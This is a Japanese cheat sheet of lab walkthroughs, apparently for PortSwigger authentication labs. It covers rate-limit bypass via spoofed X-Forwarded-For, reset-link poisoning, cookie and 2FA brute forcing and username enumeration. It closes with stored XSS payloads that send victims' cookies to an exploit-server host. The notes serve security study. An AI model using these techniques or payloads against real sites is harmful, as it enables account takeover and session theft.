# Authentication

## Request

### Header

#### X-Forwarded-Forの偽装
IPベースのbrute-force対策は、X-Forwarded-Forのようなクライアントが偽装できるヘッダーを信用している場合がある。リクエストごとに値を変えて別IPを装うと制限をすり抜けられる
```
X-Forwarded-For: 1.2.3.4
→ IntruderでpasswordとX-Forwarded-Forの値を同時に変数化(Pitchfork)して総当たり
```

#### 正規ログインでカウンタリセット
IPブロックの失敗回数カウンタが、同じIPからの成功ログインでリセットされる実装がある場合、上限に達する前に自分の正規ログインを1回ごとに挟むことでブロックされずに総当たりできる
```
制限が「3回連続失敗でブロック」なら、毎回1:1で交互に送って常に失敗を1回以内に抑える:
1. wiener:peter(正規ログイン成功、カウンタリセット)
2. carlos:候補1(失敗、まだ1回)
3. wiener:peter(リセット)
4. carlos:候補2(失敗、まだ1回)
5. wiener:peter(リセット)
...
Pitchfork攻撃でusername/password両方を1:1で変数化し、Resource poolで同時接続数を1に制限して送信順を保証する
```

#### X-Forwarded-Hostでパスワードリセットリンクを汚染
パスワードリセットのリンク生成が`X-Forwarded-Host`ヘッダーの値をドメイン部分に使っている場合、このヘッダーを攻撃者のexploit serverに書き換えることで、被害者に送られるリセットリンクのドメインごと乗っ取れる
```
POST /forgot-password
X-Forwarded-Host: exploit-xxxx.exploit-server.net
body: username=carlos

→ carlos宛のリセットメールのリンクが exploit-xxxx.exploit-server.net/forgot-password?temp-forgot-password-token=XXX になる
→ 被害者がリンクを踏む(またはbotがクロールする)と、トークンがexploit serverのAccess logに記録される
→ 盗んだトークンを、本物のドメインのリセットURLのtoken部分に差し替えてアクセス
  (正しいドメイン: https://本物のラボ/forgot-password?temp-forgot-password-token=盗んだトークン)
→ carlosの新パスワードを設定できる
```

### Cookie

#### stay-logged-in系Cookieの総当たり
「ログイン状態を保持する」Cookieが、ログインフォーム本体とは別の認証経路になっている場合がある。フォーム側に試行回数制限(アカウントロック)がかかっていても、このCookieの検証には同じ制限がかかっていないことがあり、制限をすり抜けてブルートフォースできる
```
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

base64デコード → wiener:51dc30ddc473d43a6011e9ebba6ca770
                 (username : 32文字16進数 ← MD5ハッシュの特徴)
51dc30ddc473d43a6011e9ebba6ca770 を解析(CrackStation等) → peter(=wienerのパスワード)

→ 値の正体は base64(username:md5(password))

Intruderで候補パスワードをMD5化→"carlos:"を付けて連結→base64化、を1つのCookie値として組み立て直し、
stay-logged-inの値として総当たりする(ログインフォームのロックを経由しないため制限なし)
```

### Body

#### hidden input の書き換え(パスワードリセット)
パスワードリセット実行リクエストに`username`がhidden fieldとして入っている。サーバーは「tokenが誰のものか」を紐付けて検証しておらず、実際に誰のパスワードを変えるかは`username`パラメータだけで決まる。token自体は適当な値(または削除)でもよく、usernameだけ別人に書き換えれば成立する
```
POST /forgot-password?token=<自分の正規token>
body: token=<何らかの値 or 削除>&username=wiener&new-password=...
→ body: token=<何らかの値 or 削除>&username=carlos&new-password=...
```

#### パスワード変更機能での安全な総当たり(new-passwordを不一致にする)
パスワード変更リクエストのhidden fieldに`username`がある場合、他人のusernameに書き換えて`current-password`を総当たりできることがある。ただし、新パスワードを2つとも同じ値にすると、正解を送った時点でパスワードが変更されてしまう。

このラボでは、**新パスワードをわざと不一致にして、変更を防ぎながら現在のパスワードだけを判定する**。現在のパスワードが間違っていれば「現在のパスワードが違う」、正しければ「新パスワードが一致しない」と返るため、エラーの違いで正解がわかる
```
POST /my-account/change-password
body: username=carlos&current-password=<候補>&new-password-1=aaa&new-password-2=bbb

※ 新パスワードは aaa と bbb で不一致にしておく

候補が不正解 → "Current password is incorrect"
候補が正解   → "New passwords do not match"

Intruderではcurrent-passwordだけを総当たりする。
Grep Matchで"New passwords do not match"を含む行を探す → その候補が正解
```

#### password欄に配列を詰めて一括判定(brute-force対策の回避)
ログインが認証情報をJSONで送っていて、`password`欄が文字列ではなく配列を受け付ける実装だと、1リクエストに全候補を詰めて送れる。サーバーは配列を全要素ループで照合し、どれか1つでも正解なら302を返す。brute-force対策は「リクエスト数」でしか数えていないため、何個詰めても1回扱いで制限をすり抜けられる
```
POST /login
{"username":"carlos","password":["123456","password","qwerty", ...]}

→ どれか1つが正解なら 302 でログイン成立(全候補を1リクエストで判定)
→ そのレスポンスを右クリック → Show response in browser → URLをブラウザで開く
  → carlosとしてログイン済みになる

※候補リスト→JSON配列化は scripts/passwords-to-json が使える:
  ./scripts/passwords-to-json -c -u carlos wordlists/authentication-lab-passwords.txt | pbcopy
```

## Response

### エラーメッセージの文言差
存在するユーザー名かどうかでエラーメッセージの文言が変わることがある(username/password兼用ではなく個別に判定している)。差が句読点の有無レベルの微細な場合もあるので、Grep - Extractでエラーメッセージ部分を抽出し、結果を列でソートして異常な1件を探す
```
invalid username
invalid username or password

Invalid username or password.         ← 通常
Invalid username or password          ← 末尾がピリオドでなく半角スペース(タイポ)
```

### レスポンス長の差
メッセージ文言が同じでも、レスポンスのByte数(Content-Length)に微差があり、それが正解の合図になることがある
```
Intruderでuser/passwordリストを総当たりし、Lengthでソートして浮いている行を探す
```

### レスポンス時間の差
実在するユーザー名だとパスワード比較処理が走る分レスポンスがわずかに遅くなることがある(存在確認とパスワード比較が別ステップになっている場合)
```
Intruderでusernameリストを総当たりし、Response received timeでソートして明らかに遅い行を探す
```

### アカウントロック発生有無の差
一定回数失敗するとアカウントロックがかかる実装では、実在するユーザー名だけ数回失敗後にメッセージが変化する(「ロックされました」等)。これを目印にユーザー名を特定できる
```
Cluster bomb攻撃(username × 適当なpasswordをNull payloadsで5回分)
→ 実在するユーザーだけ、数回目から"You have made too many incorrect login attempts..."に変化
→ 存在しないユーザーは"Invalid username or password."のまま変化しない
```

## Flow

### 2段階目(2FA)のスキップ
1段階目の認証(POST /login)だけ通し、2段階目(2FA入力)のページ/リクエストを無視して保護ページへ直接アクセスする。サーバーが"user_idの存在"だけ見て"2FA完了フラグ"を見ていない場合に成立する
```
POST /login (username+password) → 302 /login2
→ /login2 を無視して /my-account に直接アクセス → 通る
```

### ロック中でも正解パスワードだけ通る欠陥
アカウントロックは「失敗回数」のチェックのみで、パスワードが実際に正しいかどうかのチェックより先に走らない実装だと、ロック中でも**正しいパスワードを送った時だけロック判定をすり抜けてログインが成立する**。特定したユーザー名に対しパスワード候補を総当たりし、エラーメッセージが一切出ない行(=ロックメッセージも出ない行)が正解
```
対象ユーザーをロック状態にしたまま、Sniper攻撃+Grep extractでパスワード候補を総当たり
→ 他は "too many incorrect login attempts" 等のロックメッセージが出るが、
   正解パスワードの行だけメッセージなし(=ログイン成立)
※ロックは一定時間(例:1分)で解除されるため、時間内に総当たりを終える必要がある
  (Burp Community版は送信速度の制限が厳しく、Proでないと現実的に間に合わない場合がある)
```

### 他人の2FAコードを発行→総当たりで突破
2段階目(login2)が「誰の2FAコードを検証するか」をセッションではなく`verify`パラメータだけで判定している実装だと、以下の2つの欠陥が合わさって任意アカウントを乗っ取れる
- 欠陥①: `verify`パラメータを書き換えるだけで、他人(carlos)宛の2FAコードを勝手に発行させられる
- 欠陥②: 発行されたコードはレート制限なしで総当たりできる(4桁なら10000通り)
```
1. GET /login2?verify=carlos をRepeaterで送信 → carlos宛の2FAコードが新規生成される(欠陥①)
2. 自分(wiener)でログインし2段階目まで進み、間違ったmfa-codeを一度送って
   verify=wiener の有効なPOST /login2 リクエストを手に入れる
3. そのリクエストをIntruderに送り、verifyをcarlosに書き換えてmfa-codeだけ総当たり(欠陥②)
4. 302が返った時点でcarlosとしてログイン成立
```

### XSSで認証Cookieを窃取(総当たり不可な時の代替)
stay-logged-in系のCookieが`base64(username:md5(password))`のような構造でも、候補パスワードリストが無ければ総当たりできない。その場合は推測を諦め、被害者のブラウザから認証Cookieの値そのものを盗む方向に切り替える。コメント欄等にStored XSSがあれば、被害者が閲覧した瞬間に`document.cookie`を外部(exploit server)へ送信させられる
```html
<script>
fetch('https://exploit-xxxx.exploit-server.net/exploit?cookie=' + encodeURIComponent(document.cookie));
</script>

<!-- 簡略版(fetchを使わずページ遷移自体でクエリに乗せる) -->
<script>document.location='//exploit-xxxx.exploit-server.net/'+document.cookie</script>
```
```
1. 上記スクリプトをコメントとして投稿(Stored XSS)
2. 被害者(自動巡回bot)がコメント一覧を閲覧 → スクリプトが実行されCookieがexploit serverに送信される
3. exploit serverのAccess logからクエリパラメータ(cookie=...)を回収
4. 自分のブラウザのstay-logged-in Cookieを回収した値に書き換えてリロード → 被害者としてログイン成立
```
※ CORS/SOPは「レスポンスを読む」ことを制限するだけで「リクエストを送る」こと自体は制限しないため、fetchでの外部送信は問題なく成立する
